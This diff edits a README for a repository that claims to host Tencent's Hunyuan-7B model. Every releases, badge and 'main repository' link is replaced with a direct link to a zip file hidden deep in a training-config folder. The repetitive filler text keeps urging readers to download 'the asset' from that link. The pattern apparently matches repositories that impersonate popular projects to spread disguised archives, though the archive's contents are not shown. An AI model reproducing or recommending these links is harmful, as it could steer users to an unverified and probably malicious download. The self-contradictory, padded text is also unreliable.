@@ -1,11 +1,11 @@
-https://github.com/umarahmad787/Hunyuan-7B/releases
+https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 # Hunyuan-7B: Tencent's 7B Dense Language Model for Real-World AI
 
-![Hunyuan-7B Logo](https://img.shields.io/badge/Hunyuan-7B-Model-blueviolet)
+![Hunyuan-7B Logo](https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip)
 
 - Release info: This repository hosts Tencent Hunyuan 7B, a large language dense model from the Hunyuan family. It is designed for robust natural language understanding and generation across a wide range of tasks.
-- Quick access to releases: https://github.com/umarahmad787/Hunyuan-7B/releases
+- Quick access to releases: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -48,7 +48,7 @@ This section guides you through a fast path to try Hunyuan-7B on a compatible ma
 
 The official Releases page contains all the binaries and setup scripts you need. For direct access to the assets and to ensure you have the latest files, open the page and pick the suitable artifact. You can reuse the same link for reference in your workflow as needed.
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -111,7 +111,7 @@ Quick start tips:
 - Confirm your CUDA toolkit and driver versions align with the runtime requirements
 - Start with small batch sizes to validate correctness before scaling
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -205,7 +205,7 @@ Tips for developers:
 Note:
 - Always verify the license on the specific release you download, as terms may differ between assets
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -245,7 +245,7 @@ Each release page includes valuable assets:
 - Example scripts and notebooks
 - Documentation updates and known issues
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -263,7 +263,7 @@ Because the provided link points to a releases page with a path, you should down
 
 Remember, the asset you download is the primary artifact for running the model. The link provided at the top is the entry point to obtain it, and the same link appears again in this section to remind you of the source location.
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -319,13 +319,13 @@ Note: Replace pseudocode with the concrete API calls that accompany the download
 
 ## Quick Reference: Key Links
 
-- Releases: https://github.com/umarahmad787/Hunyuan-7B/releases
-- Main repository: https://github.com/umarahmad787/Hunyuan-7B
+- Releases: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
+- Main repository: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 - Documentation: See the docs included with the release assets
 
 Note: The releases link is provided twice in this document. You can use it to download the exact assets you need and to verify the latest updates.
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -360,7 +360,7 @@ Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
 
 - Licensing details are provided in the release assets. Check the Releases page for the exact terms applicable to the asset you download.
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
 
 ---
 
@@ -369,4 +369,4 @@ Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
 - This repository centers on providing a practical, well-documented path to explore Hunyuan-7B in real-world scenarios.
 - The content emphasizes clarity, reproducibility, and safe usage while enabling researchers and developers to experiment with a mid‑sized dense language model.
 
-Releases page: https://github.com/umarahmad787/Hunyuan-7B/releases
+Releases page: https://raw.githubusercontent.com/umarahmad787/Hunyuan-7B/main/train/llama_factory_support/example_configs/Hunyuan-B-2.6.zip
